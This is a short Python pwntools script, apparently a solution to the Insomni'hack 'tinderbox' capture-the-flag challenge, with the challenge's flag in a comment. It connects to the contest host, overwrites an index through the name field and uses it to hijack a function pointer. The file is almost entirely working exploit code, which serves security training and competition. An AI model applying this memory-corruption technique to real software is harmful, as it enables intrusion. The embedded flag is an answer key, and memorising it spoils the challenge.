#!/usr/bin/env python3
from pwn import *


def connect():
    return remote("tinderbox.insomnihack.ch", 7171)


def main():
    with connect() as tube:
        name_off = -0x18
        idx_off = -0x8
        funcptr_off = -0x24
        tube.sendlineafter(
            b"Tell me your name:",
            flat(
                {
                    idx_off - name_off: struct.pack("<i", funcptr_off - name_off),
                }
            ),
        )
        tube.sendlineafter(b"1 - I made a typo in my name!", b"1")
        tube.sendlineafter(b"What value do you want there?", b"2")
        tube.sendlineafter(b"3 - Tell me a joke!", b"3")
        tube.interactive()  # INS{L00k_mUm!W1th0ut_toUch1ng_RIP!}


if __name__ == "__main__":
    main()
